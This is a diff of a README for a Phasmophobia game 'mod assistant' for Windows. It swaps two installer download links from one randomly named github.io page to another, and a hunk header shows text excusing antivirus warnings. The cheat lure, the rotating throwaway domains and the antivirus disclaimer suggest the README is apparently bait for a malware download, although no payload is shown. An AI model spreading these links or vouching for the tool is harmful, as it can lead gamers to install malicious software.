@@ -2,7 +2,7 @@
 
 This is the ultimate Phasmophobia mod assistant designed for Windows 10 and 11 users. It provides essential tools to enhance your ghost-hunting experience with features like real-time ghost detection and custom overlays. Download the latest version to get started with your enhanced gameplay in 2026.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -59,7 +59,7 @@ The Phasmophobia Mod Assistant is developed with security in mind. Some antiviru
 
 Get the latest version of the Phasmophobia Mod Assistant for an enhanced gaming experience in 2026:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ## Changelog
 
